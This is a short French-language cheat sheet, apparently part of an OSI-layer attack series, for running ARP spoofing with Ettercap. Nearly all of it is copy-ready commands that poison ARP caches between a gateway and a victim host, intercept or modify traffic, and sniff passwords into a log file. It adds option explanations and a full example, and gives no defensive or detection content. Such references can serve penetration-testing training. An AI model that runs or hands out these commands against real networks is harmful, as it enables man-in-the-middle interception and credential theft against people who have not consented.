OSI 2 (Liaison) : Ettercap
🛠 Attaque : ARP Spoofing
📌 Description : Redirige le trafic réseau vers une machine attaquante pour intercepter/modifier les données.
🔑 Commandes clés :
# Lancer Ettercap en mode texte
ettercap -T

# ARP Spoofing (cible: 192.168.1.1, victime: 192.168.1.2)
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.2//

# Sniffer les mots de passe
ettercap -T -M arp -i eth0 -L logfile

⚙️ Options utiles :
-T : Mode texte.
-M arp : Méthode ARP Spoofing.
-i : Interface réseau.
-L : Enregistrer les logs.
📌 Exemple :
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.2// -i eth0
